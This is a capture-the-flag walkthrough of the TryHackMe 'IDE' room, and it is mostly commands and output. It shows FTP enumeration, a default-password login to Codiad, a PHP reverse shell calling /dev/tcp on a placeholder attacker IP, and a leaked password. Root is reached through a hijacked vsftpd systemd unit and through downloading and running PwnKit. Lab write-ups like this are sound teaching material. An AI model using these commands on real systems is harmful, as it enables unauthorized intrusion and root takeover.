---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - RCE
  - Sudo
  - Systemd
  - PwnKit
---
https://tryhackme.com/room/ide/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.2.34.122 ide.thm
```
# Scanning
```console
$ nmap -p21,22,80,62337 -sV -sC ide.thm

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.34.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The following ports contain:
- 80: default Apache page.
- 62337: login page for [Codiad web IDE](https://github.com/Codiad/Codiad) 2.8.4 (has multiple [RCE CVEs](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit)).
# Enumeration
Found a file named `-` in the FTP service:
```console
$ ftp anonymous@ide.thm
Connected to ide.thm.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.

ftp> cd ...
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.

ftp> quit
221 Goodbye.
```
Found that **user john** is using a **default password**:
```console
$ curl -s -o note.txt 'ftp://anonymous@ide.thm/.../-'

$ cat note.txt
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```
Then, successful login at port 62337 with credentials `john:password`.
# Exploitation
After login, we can read and write multiple Python files located at `/var/www/html/codiad_projects/`. So, we create a reverse shell file called `rev.php` with the following content:
```php
<?php
    shell_exec("bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'");
?>
```
Then, we listen for connections:
```bash
nc -lvnp <PORT>
```
Finally, we load the reverse shell file:
```bash
curl -s 'http://ide.thm/codiad_projects/rev.php'
```
# Post-Exploitation
## User migration
Found **user drac**:
```console
$ grep 'sh$' /etc/passwd

root:x:0:0:root:/root:/bin/bash
drac:x:1000:1000:drac:/home/drac:/bin/bash
```
Found **user drac credentials**, so become him:
```console
$ cat /home/drac/.bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'

$ su drac -
Password:
```
Get the **user flag**:
```bash
cat /home/drac/user.txt
```
## Service manipultation
**User drac** can restart the `vsftpd.service` using **SUDO**.
```console
$ sudo -l

Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```
We have write permissions to the `vsftpd.service`:
```console
$ ls -l /lib/systemd/system/vsftpd.service

-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
```
Modify the `/lib/systemd/system/vsftpd.service` command:
```ini
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
```
Listen for connections:
```bash
nc -lvnp <PORT>
```
Restart the service:
```console
$ sudo /usr/sbin/service vsftpd restart
Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.

$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===

$ sudo /usr/sbin/service vsftpd restart
```
Get the **root flag**:
```bash
cat /root/root.txt
```
## PwnKit (alternative)
The `/usr/bin/pkexec` binary has **SUID permissions**:
```console
$ ls -l /usr/bin/pkexec

-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
```
In the attacker's machine, clone and share the [PwnKit](https://github.com/ly4k/PwnKit) exploit:
```console
$ git clone https://github.com/ly4k/PwnKit

$ cd PwnKit

$ python3 -m http.server 8000
```
In the victim's machine, download and execute the exploit:
```console
$ curl -s -O 'http://<ATTACKER-IP>:8000/PwnKit'

$ chmod +x PwnKit

$ ./PwnKit
```